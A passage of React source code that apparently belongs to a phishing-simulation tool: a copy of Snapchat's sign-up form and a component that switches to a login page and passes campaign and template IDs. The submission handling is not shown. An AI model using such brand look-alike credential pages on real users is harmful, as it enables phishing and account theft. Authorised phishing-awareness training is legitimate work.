            <p className="text-sm font-medium text-[#444] mb-1.5">Birthday</p>
            <div className="flex gap-2">
              <input type="text" placeholder="Month" maxLength={15} value={month} onChange={(e) => setMonth(e.target.value)} className={inputCls} />
              <input type="text" placeholder="Day" maxLength={2} value={day} onChange={(e) => setDay(e.target.value)} className={inputCls} />
              <input type="text" placeholder="Year" maxLength={4} value={year} onChange={(e) => setYear(e.target.value)} className={inputCls} />
            </div>
          </div>

          {/* Username */}
          <div>
            <p className="text-sm font-medium text-[#444] mb-1.5">Username</p>
            <input type="text" placeholder="Enter your username" value={snapUsername} onChange={(e) => setSnapUsername(e.target.value)} className={inputCls} />
            <p className="text-[11px] text-[#aaa] mt-1">You can change this later</p>
          </div>

          {/* Password */}
          <div>
            <p className="text-sm font-medium text-[#444] mb-1.5">Password</p>
            <div className="relative">
              <input
                type={showPassword ? 'text' : 'password'}
                placeholder="Enter a secure password"
                value={signupPassword}
                onChange={(e) => setSignupPassword(e.target.value)}
                className={`${inputCls} pr-11`}
              />
              <button type="button" onClick={() => setShowPassword((v) => !v)} className="absolute right-3 top-1/2 -translate-y-1/2 text-[#bbb] hover:text-[#666]">
                {showPassword ? (
                  <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21" />
                  </svg>
                ) : (
                  <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                  </svg>
                )}
              </button>
            </div>
            <p className="text-[11px] text-[#aaa] mt-1">Password must be at least 8 characters</p>
          </div>

          {/* Terms */}
          <p className="text-[11px] text-[#666] leading-relaxed">
            By tapping "Agree and Continue" below, you agree to the{' '}
            <span className="text-[#0AABF0] cursor-pointer underline">Terms of Service</span> and acknowledge that you have read the{' '}
            <span className="text-[#0AABF0] cursor-pointer underline">Privacy Policy</span>.
          </p>

          {/* Submit */}
          <button
            type="submit"
            disabled={loading}
            className="w-full py-3 rounded-full text-white font-bold text-sm transition-opacity disabled:opacity-60"
            style={{ backgroundColor: '#0AABF0' }}
          >
            {loading ? (
              <span className="flex items-center justify-center gap-2">
                <svg className="w-4 h-4 animate-spin" fill="none" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="white" strokeWidth="4" />
                  <path className="opacity-75" fill="white" d="M4 12a8 8 0 018-8v8H4z" />
                </svg>
                Creating account…
              </span>
            ) : (
              'Agree and Continue'
            )}
          </button>
        </form>

        {/* Bottom links */}
        <div className="flex justify-between mt-6 text-[11px] text-[#888]">
          <span>
            Already have an account?{' '}
            <span className="text-[#0AABF0] font-semibold cursor-pointer hover:underline" onClick={onLogin}>
              Log In
            </span>
          </span>
          <span className="text-right">
            Advertising on Snapchat?{' '}
            <span className="text-[#0AABF0] cursor-pointer hover:underline">Sign Up for Ads Manager</span>
          </span>
        </div>
      </div>
    </div>
  );
}

// ── Main export ─────────────────────────────────────────────────
export default function SnapchatSimulation({ onSubmitAttempt, campaignId, templateId }: SnapchatSimulationProps) {
  const [page, setPage] = useState<'login' | 'signup'>('login');

  if (page === 'signup') {
    return <SignUpPage onLogin={() => setPage('login')} />;
  }

  return (
    <LoginPage
      onSubmitAttempt={onSubmitAttempt}
      onSignUp={() => setPage('signup')}
      campaignId={campaignId}
      templateId={templateId}
    />
  );
}
